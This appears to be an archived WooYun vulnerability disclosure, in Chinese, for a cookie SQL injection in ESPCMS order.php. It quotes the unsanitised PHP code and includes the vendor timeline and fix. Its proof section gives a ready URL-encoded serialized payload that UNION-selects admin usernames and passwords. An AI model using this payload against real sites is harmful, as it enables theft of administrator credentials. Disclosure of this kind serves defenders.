@@ -1,0 +1,205 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ESPCMS COOKIE注入与详细分析  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ESPCMS COOKIE注入与详细分析  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Kavia">Kavia</a> 
+</li><li>提交时间：		2013-04-04 10:44</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-23：	厂商提前公开漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">对于从cookie中取出的值过滤不严，造成sql注入（可无视GPC）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/espcms/interface/order.php<br />
+<br />
+</p><pre><code>function in_list() {<br />
+	parent::start_pagetemplate();<br />
+	$lng = (admin_LNG == &#039;big5&#039;) ? $this-&gt;CON[&#039;is_lancode&#039;] : admin_LNG;<br />
+	$cartid = $this-&gt;fun-&gt;accept(&#039;ecisp_order_list&#039;, &#039;C&#039;);	//接收cookies[‘ecisp_order_list’]<br />
+	$cartid = stripslashes(htmlspecialchars_decode($cartid));<br />
+	$uncartid = !empty($cartid) ? unserialize($cartid) : 0;		//$cartid有特殊的格式要求<br />
+	if ($uncartid &amp;&amp; is_array($uncartid)) {<br />
+		$didarray = $this-&gt;fun-&gt;key_array_name($uncartid, &#039;did&#039;, &#039;amount&#039;);<br />
+		$didlist = $this-&gt;fun-&gt;format_array_text(array_keys($didarray), &#039;,&#039;);<br />
+		if (!empty($didlist)) {<br />
+			$db_table = db_prefix . &#039;document&#039;;<br />
+			$db_where = &quot;isclass=1 AND isorder=1 AND did in($didlist) ORDER BY did DESC&quot;;<br />
+			$sql=&quot;SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM $db_table WHERE $db_where&quot;;	//动态构造sql语句<br />
+			$rs = $this-&gt;db-&gt;query($sql);		//直接带入查询</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+直接获取cookies[‘ecisp_order_list’]的值，没有经过过滤，直接被用来构造了sql语句，并带入了查询。所以此处形成了一个cookie注入。<br />
+<br />
+<br />
+<br />
+接收到的cookies[‘ecisp_order_list’]在整个传递过程中，经过了htmlspecialchars_decode()、stripslashes()、unserialize()、key_array_name()、array_keys()、format_array_text()几个函数。<br />
+<br />
+其中stripslashes()使得注入语句可以无视GPC的影响。<br />
+<br />
+但是，由于unserialize()的使用，使得构造exp的难度加大；因为传入unserialize()的值，必须使用一种规定的特殊格式（实施上，我也没有完全吃透这个特殊格式）<br />
+<br />
+我就依靠运气，和一点小技巧，成功地构造出了exp，这里就不细说了。大家可以通过打印几个函数的返回值，来找到构造的方法。（或者，也可以通过下面的exp，来找寻一些规律） </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">exp：<br />
+<br />
+</p><pre><code>a%3a1%3a%7bs%3a3%3a%22k23%22%3ba%3a2%3a%7bs%3a3%3a%22did%22%3bs%3a159%3a%2224)+and+1%3d2+union+select+1%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2cpassword%2cusername%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%2c29%2c30%2c31+from+espcms_admin_member+where+1+in+(1%22%3bs%3a6%3a%22amount%22%3bi%3a1%3b%7d%7d</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+获取管理员信息：<br />
+<br />
+</p><p class="detail"><a href="../images/0409411465a81afbc15a16ea67cc424d4e5a8bb8.jpg" target="_blank"><img src="../images/0409411465a81afbc15a16ea67cc424d4e5a8bb8.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+官网后台：<br />
+<br />
+</p><p class="detail"><a href="../images/040941374f9e1749f3263eee4458b3445f7a5c53.jpg" target="_blank"><img src="../images/040941374f9e1749f3263eee4458b3445f7a5c53.jpg" alt=".jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">在进入sql语句之前，对变量进行过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Kavia" title="Kavia">Kavia</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021227" title="ESPCMS COOKIE注入与详细分析">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-04-05 16:32</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对本漏洞的提醒！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-04-23：已修正此漏洞，登陆官网下载最新的程序包即可！</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21227";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
